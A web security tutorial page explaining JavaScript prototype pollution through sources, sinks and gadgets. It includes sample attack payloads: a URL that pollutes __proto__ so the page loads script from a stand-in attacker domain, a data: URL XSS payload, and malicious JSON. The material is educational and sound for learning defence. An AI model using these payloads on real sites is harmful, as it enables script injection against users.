---
来源: https://portswigger.net/web-security/prototype-pollution
类型: html
获取日期: 2026-06-29
---

What is prototype pollution? | Web Security Academy


!function(t,e){var o,n,p,r;e.\_\_SV||(window.posthog && window.posthog.\_\_loaded)||(window.posthog=e,e.\_i=[],e.init=function(i,s,a){function g(t,e){var o=e.split(".");2==o.length&&(t=t[o[0]],e=o[1]),t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}}(p=t.createElement("script")).type="text/javascript",p.crossOrigin="anonymous",p.async=!0,p.src=s.api\_host.replace(".i.posthog.com","-assets.i.posthog.com")+"/static/array.js",(r=t.getElementsByTagName("script")[0]).parentNode.insertBefore(p,r);var u=e;for(void 0!==a?u=e[a]=[]:a="posthog",u.people=u.people||[],u.toString=function(t){var e="posthog";return"posthog"!==a&&(e+="."+a),t||(e+=" (stub)"),e},u.people.toString=function(){return u.toString(1)+".people (stub)"},o="init Dr qr Ci Br Zr Pr capture calculateEventProperties Ur register register\_once register\_for\_session unregister unregister\_for\_session Xr getFeatureFlag getFeatureFlagPayload getFeatureFlagResult isFeatureEnabled reloadFeatureFlags updateFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys renderSurvey displaySurvey cancelPendingSurvey canRenderSurvey canRenderSurveyAsync Jr identify setPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset setIdentity clearIdentity get\_distinct\_id getGroups get\_session\_id get\_session\_replay\_url alias set\_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException captureLog startExceptionAutocapture stopExceptionAutocapture loadToolbar get\_property getSessionProperty Gr Hr createPersonProfile setInternalOrTestUser Wr Fr tn opt\_in\_capturing opt\_out\_capturing has\_opted\_in\_capturing has\_opted\_out\_capturing get\_explicit\_consent\_status is\_capturing clear\_opt\_in\_out\_capturing $r debug ki Yr getPageViewId captureTraceFeedback captureTraceMetric Rr".split(" "),n=0;n<o.length;n++)g(u,o[n]);e.\_i.push([i,s,a])},e.\_\_SV=1)}(document,window.posthog||[]);
posthog.init('phc\_zmnmWxifkm9THV54Mrn2XvFDL3Tq497pyRgrYbDu5PGW', {
api\_host: 'https://phingest.staging.portswigger.com',
defaults: '2026-01-30',
person\_profiles: 'identified\_only',
})


(function (window, document, dataLayerName, id) {
window[dataLayerName] = window[dataLayerName] || [], window[dataLayerName].push({
start: (new Date).getTime(),
event: "stg.start"
});
var scripts = document.getElementsByTagName('script')[0], tags = document.createElement('script');
var qP = [];
dataLayerName !== "dataLayer" && qP.push("data\_layer\_name=" + dataLayerName), tags.nonce = "xKAt/F/BujE4bJ08tot1bsnzvv0bDh1s";
var qPString = qP.length > 0 ? ("?" + qP.join("&")) : "";
tags.async = !0, tags.src = "https://ps.containers.piwik.pro/" + id + ".js" + qPString,
scripts.parentNode.insertBefore(tags, scripts);
!function (a, n, i) {
a[n] = a[n] || {};
for (var c = 0; c < i.length; c++) !function (i) {
a[n][i] = a[n][i] || {}, a[n][i].api = a[n][i].api || function () {
var a = [].slice.call(arguments, 0);
"string" == typeof a[0] && window[dataLayerName].push({
event: n + "." + i + ":" + a[0],
parameters: [].slice.call(arguments, 1)
})
}
}(i[c])
}(window, "ppms", ["tm", "cm"]);
})(window, document, 'dataLayer', '287552c2-4917-42e0-8982-ba994a2a73d7');


[My account](/users/youraccount/personaldetails)


Products


Solutions

[Research](/research)
[Academy](/web-security)

Support


Company

[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)

[My account](/users/youraccount)
[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)

[![Burp Suite DAST](/content/images/svg/icons/enterprise.svg)
**Burp Suite DAST**
The enterprise-enabled dynamic web vulnerability scanner.](/burp/enterprise)
[![Burp Suite Professional](/content/images/svg/icons/professional.svg)
**Burp Suite Professional**
The world's #1 web penetration testing toolkit.](/burp/pro)
[![Burp Suite Community Edition](/content/images/svg/icons/community.svg)
**Burp Suite Community Edition**
The best manual tools to start web security testing.](/burp/communitydownload)
[View all product editions](/burp)

[**Burp Scanner**

Burp Suite's web vulnerability scanner

![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg)](/burp/vulnerability-scanner)

[**Attack surface visibility**
Improve security posture, prioritize manual testing, free up time.](/solutions/attack-surface-visibility)
[**CI-driven scanning**
More proactive security - find and fix vulnerabilities earlier.](/solutions/ci-driven-scanning)
[**Application security testing**
See how our software enables the world to secure the web.](/solutions)
[**DevSecOps**
Catch critical bugs; ship more secure software, more quickly.](/solutions/devsecops)
[**Penetration testing**
Accelerate penetration testing - find more bugs, more quickly.](/solutions/penetration-testing)
[**Automated scanning**
Scale dynamic scanning. Reduce risk. Save time/money.](/solutions/automated-security-testing)
[**Bug bounty hunting**
Level up your hacking and earn more bug bounties.](/solutions/bug-bounty-hunting)
[**Compliance**
Enhance security monitoring to comply with confidence.](/solutions/compliance)

[View all solutions](/solutions)

[**Product comparison**

What's the difference between Pro and DAST?

![Burp Suite Professional vs Burp Suite DAST](/mega-nav/images/burp-suite.jpg)](/burp/dast/resources/dast-vs-professional)

[**Support Center**
Get help and advice from our experts on all things Burp.](/support)
[**Documentation**
Tutorials and guides for Burp Suite.](/burp/documentation)
[**Get Started - Professional**
Get started with Burp Suite Professional.](/burp/documentation/desktop/getting-started)
[**Get Started - DAST**
Get started with Burp Suite DAST.](/burp/documentation/dast/getting-started)
[**Downloads**
Download the latest version of Burp Suite.](/burp/releases)

[Visit the Support Center](/support)

[**Downloads**

Download the latest version of Burp Suite.

![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg)](/burp/releases)


Academy home

* [Dashboard](https://portswigger.net/web-security/dashboard)
* [Learning paths](https://portswigger.net/web-security/learning-paths)
* Latest topics

  [Request smuggling](/web-security/request-smuggling)
  [Web cache deception](/web-security/web-cache-deception)
  [Web LLM attacks](/web-security/llm-attacks)
  [API testing](/web-security/api-testing)
  [NoSQL injection](/web-security/nosql-injection)
  [View all topics](/web-security/all-topics)
* All content

  [All labs](/web-security/all-labs)
  [All topics](/web-security/all-topics)
  [Mystery labs](/web-security/mystery-lab-challenge)
* Hall of Fame

  [Leaderboard](https://portswigger.net/web-security/hall-of-fame)
  [Interview - Kamil Vavra](https://portswigger.net/web-security/getting-started/kamil-vavra/index.html)
  [Interview - Johnny Villarreal](https://portswigger.net/web-security/getting-started/johnny-villarreal/index.html)
  [Interview - Andres Rauschecker](https://portswigger.net/web-security/getting-started/andres-rauschecker/index.html)
* [Get started](https://portswigger.net/web-security/getting-started/index.html)
* Get certified

  [Get certified](https://portswigger.net/web-security/certification/index.html)
  [How to prepare](https://portswigger.net/web-security/certification/how-to-prepare/index.html)
  [How it works](https://portswigger.net/web-security/certification/how-it-works/index.html)
  [Practice exam](https://portswigger.net/web-security/certification/practice-exam/index.html)
  [Exam hints and guidance](https://portswigger.net/web-security/certification/exam-hints-and-guidance/index.html)
  [What the exam involves](https://portswigger.net/web-security/certification/how-it-works/index.html#what-the-exam-involves)
  [FAQs](https://portswigger.net/web-security/certification/frequently-asked-questions/index.html)
  [Validate your certification](https://portswigger.net/web-security/certification#validate-your-certification)

[Back to all topics](/web-security/all-topics)


### Prototype pollution

* [What is prototype pollution?](/web-security/prototype-pollution)
* [JavaScript prototypes and inheritance](/web-security/prototype-pollution/javascript-prototypes-and-inheritance)

  + [What is an object in JavaScript?](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#what-is-an-object-in-javascript)
  + [What is a prototype in JavaScript?](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#what-is-a-prototype-in-javascript)
  + [Object inheritance](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#how-does-object-inheritance-work-in-javascript)
  + [Prototype chain](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#the-prototype-chain)
  + [Accessing an object's prototype](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#accessing-an-object-s-prototype-using-proto)
  + [Modifying prototypes](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#modifying-prototypes)
* [How vulnerabilities arise](/web-security/prototype-pollution#how-do-prototype-pollution-vulnerabilities-arise)
* [Sources](/web-security/prototype-pollution#prototype-pollution-sources)

  + [URL](/web-security/prototype-pollution#prototype-pollution-via-the-url)
  + [JSON input](/web-security/prototype-pollution#prototype-pollution-via-json-input)
* [Sinks](/web-security/prototype-pollution#prototype-pollution-sinks)
* [Gadgets](/web-security/prototype-pollution#prototype-pollution-gadgets)
* [Client-side prototype pollution](/web-security/prototype-pollution/client-side)

  + [Finding sources manually](/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-sources-manually)
  + [Finding sources using DOM Invader](/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-sources-using-dom-invader)
  + [Finding gadgets manually](/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-gadgets-manually)
  + [Finding gadgets using DOM Invader](/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-gadgets-using-dom-invader)
  + [Prototype pollution via the constructor](/web-security/prototype-pollution/client-side#prototype-pollution-via-the-constructor)
  + [Bypassing flawed key sanitization](/web-security/prototype-pollution/client-side#bypassing-flawed-key-sanitization)
  + [Prototype pollution in external libraries](/web-security/prototype-pollution/client-side#prototype-pollution-in-external-libraries)
  + [Prototype pollution via browser APIs](/web-security/prototype-pollution/client-side/browser-apis)

    - [fetch() method](/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-fetch)
    - [Object.defineProperty() method](/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-object-defineproperty)
* [Server-side prototype pollution](/web-security/prototype-pollution/server-side)

  + [Why is server-side prototype pollution more difficult to detect?](/web-security/prototype-pollution/server-side#why-is-server-side-prototype-pollution-more-difficult-to-detect)
  + [Detecting via polluted property reflection](/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-via-polluted-property-reflection)
  + [Detecting without polluted property reflection](/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection)

    - [Status code override](/web-security/prototype-pollution/server-side#status-code-override)
    - [JSON spaces override](/web-security/prototype-pollution/server-side#json-spaces-override)
    - [Charset override](/web-security/prototype-pollution/server-side#charset-override)
  + [Scanning for sources](/web-security/prototype-pollution/server-side#scanning-for-server-side-prototype-pollution-sources)
  + [Bypassing input filters](/web-security/prototype-pollution/server-side#bypassing-input-filters-for-server-side-prototype-pollution)
  + [Remote code execution](/web-security/prototype-pollution/server-side#remote-code-execution-via-server-side-prototype-pollution)

    - [Identifying a vulnerable request](/web-security/prototype-pollution/server-side#identifying-a-vulnerable-request)
    - [child\_process.fork() method](/web-security/prototype-pollution/server-side#remote-code-execution-via-child-process-fork)
    - [child\_process.execSync() method](/web-security/prototype-pollution/server-side#remote-code-execution-via-child-process-execsync)
* [Preventing vulnerabilities](/web-security/prototype-pollution/preventing)

  + [Sanitizing property keys](/web-security/prototype-pollution/preventing#sanitizing-property-keys)
  + [Preventing changes to prototype objects](/web-security/prototype-pollution/preventing#preventing-changes-to-prototype-objects)
  + [Preventing an object from inheriting properties](/web-security/prototype-pollution/preventing#preventing-an-object-from-inheriting-properties)
  + [Using safer alternatives where possible](/web-security/prototype-pollution/preventing#using-safer-alternatives-where-possible)
* [View all prototype pollution labs](/web-security/all-labs#prototype-pollution)


* [Web Security Academy](/web-security)
* [Prototype pollution](/web-security/prototype-pollution)

# What is prototype pollution?

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

![Polluting a config object via prototype pollution](/web-security/prototype-pollution/images/prototype-pollution-infographic.svg)

Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to [DOM XSS](/web-security/cross-site-scripting/dom-based), while server-side prototype pollution can even result in remote code execution.

If you're unfamiliar with how prototypes and inheritance work in JavaScript, we recommend reading the following overview before continuing.

[JavaScript prototypes and inheritance](/web-security/prototype-pollution/javascript-prototypes-and-inheritance)

#### Labs

If you're already familiar with prototype pollution and just want to practice on a series of deliberately vulnerable sites, check out the link below for an overview of all labs in this topic.

* [LABS View all prototype pollution labs](/web-security/all-labs#prototype-pollution)

## How do prototype pollution vulnerabilities arise?

Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like `__proto__`, along with arbitrary nested properties.

Due to the [special meaning of `__proto__`](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#accessing-an-object-s-prototype-using-proto) in a JavaScript context, the merge operation may assign the nested properties to the object's [prototype](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#what-is-a-prototype-in-javascript) instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.

It's possible to pollute any prototype object, but this most commonly occurs with the [built-in global `Object.prototype`](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#the-prototype-chain).

Successful exploitation of prototype pollution requires the following key components:

* [A prototype pollution source](/web-security/prototype-pollution#prototype-pollution-sources) - This is any input that enables you to poison prototype objects with arbitrary properties.
* [A sink](/web-security/prototype-pollution#prototype-pollution-sinks) - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
* [An exploitable gadget](/web-security/prototype-pollution#prototype-pollution-gadgets) - This is any property that is passed into a sink without proper filtering or sanitization.

## Prototype pollution sources

A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:

* The [URL](/web-security/prototype-pollution#prototype-pollution-via-the-url) via either the query or fragment string (hash)
* [JSON-based input](/web-security/prototype-pollution#prototype-pollution-via-json-input)
* Web messages

### Prototype pollution via the URL

Consider the following URL, which contains an attacker-constructed query string:

`https://vulnerable-website.com/?__proto__[evilProperty]=payload`

When breaking the query string down into `key:value` pairs, a URL parser may interpret `__proto__` as an arbitrary string. But let's look at what happens if these keys and values are subsequently merged into an existing object as properties.

You might think that the `__proto__` property, along with its nested `evilProperty`, will just be added to the target object as follows:

`{
existingProperty1: 'foo',
existingProperty2: 'bar',
__proto__: {
evilProperty: 'payload'
}
}`

However, this isn't the case. At some point, the recursive merge operation may assign the value of `evilProperty` using a statement equivalent to the following:

`targetObject.__proto__.evilProperty = 'payload';`

During this assignment, the JavaScript engine treats `__proto__` as a getter for the prototype. As a result, `evilProperty` is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default `Object.prototype`, all objects in the JavaScript runtime will now inherit `evilProperty`, unless they already have a property of their own with a matching key.

In practice, injecting a property called `evilProperty` is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.

### Prototype pollution via JSON input

User-controllable objects are often derived from a JSON string using the `JSON.parse()` method. Interestingly, `JSON.parse()` also treats any key in the JSON object as an arbitrary string, including things like `__proto__`. This provides another potential vector for prototype pollution.

Let's say an attacker injects the following malicious JSON, for example, via a web message:

`{
"__proto__": {
"evilProperty": "payload"
}
}`

If this is converted into a JavaScript object via the `JSON.parse()` method, the resulting object will in fact have a property with the key `__proto__`:

`const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
objectLiteral.hasOwnProperty('__proto__'); // false
objectFromJson.hasOwnProperty('__proto__'); // true`

If the object created via `JSON.parse()` is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous [URL-based example](/web-security/prototype-pollution#prototype-pollution-via-the-url).

## Prototype pollution sinks

A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on [DOM XSS](/web-security/cross-site-scripting/dom-based).

As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.

## Prototype pollution gadgets

A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:

* Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
* Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.

A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. [Robust websites](/web-security/prototype-pollution/preventing#preventing-an-object-from-inheriting-properties) may also explicitly set the prototype of the object to `null`, which ensures that it doesn't inherit any properties at all.

### Example of a prototype pollution gadget

Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:

`let transport_url = config.transport_url || defaults.transport_url;`

Now imagine the library code uses this `transport_url` to add a script reference to the page:

`` let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script); ``

If the website's developers haven't set a `transport_url` property on their `config` object, this is a potential gadget. In cases where an attacker is able to pollute the global `Object.prototype` with their own `transport_url` property, this will be inherited by the `config` object and, therefore, set as the `src` for this script to a domain of the attacker's choosing.

If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:

`https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`

By providing a `data:` URL, an attacker could also directly embed an XSS payload within the query string as follows:

`https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`

Note that the trailing `//` in this example is simply to comment out the hardcoded `/example.js` suffix.

### What next?

Now that you're familiar with the concepts behind prototype pollution, let's take a look at how you can find these vulnerabilities in real-world applications:

* [LABS Client-side prototype pollution vulnerabilities](/web-security/prototype-pollution/client-side)
* [LABS Server-side prototype pollution vulnerabilities](/web-security/prototype-pollution/server-side)
* [Preventing prototype pollution vulnerabilities](/web-security/prototype-pollution/preventing)


![Try Burp Suite for Free](/content/images/logos/burp-suite-icon.svg)

#### Find prototype pollution vulnerabilities using Burp Suite

[Try for free](https://portswigger.net/burp)

Burp Suite

[Web vulnerability scanner](/burp/vulnerability-scanner)
[Burp Suite Editions](/burp)
[Release Notes](/burp/releases)

Vulnerabilities

[Cross-site scripting (XSS)](/web-security/cross-site-scripting)
[SQL injection](/web-security/sql-injection)
[Cross-site request forgery](/web-security/csrf)
[XML external entity injection](/web-security/xxe)
[Directory traversal](/web-security/file-path-traversal)
[Server-side request forgery](/web-security/ssrf)

Customers

[Organizations](/organizations)
[Testers](/testers)
[Developers](/developers)

Company

[About](/about)
[Careers](/careers)
[Contact](/about/contact)
[Legal](/legal)
[Privacy Notice](/privacy)
[Modern Slavery Statement](/modern-slavery-statement)

Insights

[Web Security Academy](/web-security)
[Blog](/blog)
[Research](/research)

[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](/)
 [Follow us](https://twitter.com/Burp_Suite)

© 2026 PortSwigger Ltd.


piAId = '1067743';
piCId = '';
piHostname = 'go.portswigger.net';
(function () {
function async\_load() {
var s = document.createElement('script');
s.type = 'text/javascript';
s.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + piHostname + '/pd.js';
var c = document.getElementsByTagName('script')[0];
c.parentNode.insertBefore(s, c);
}
if (window.attachEvent) {
window.attachEvent('onload', async\_load);
} else {
window.addEventListener('load', async\_load, false);
}
})();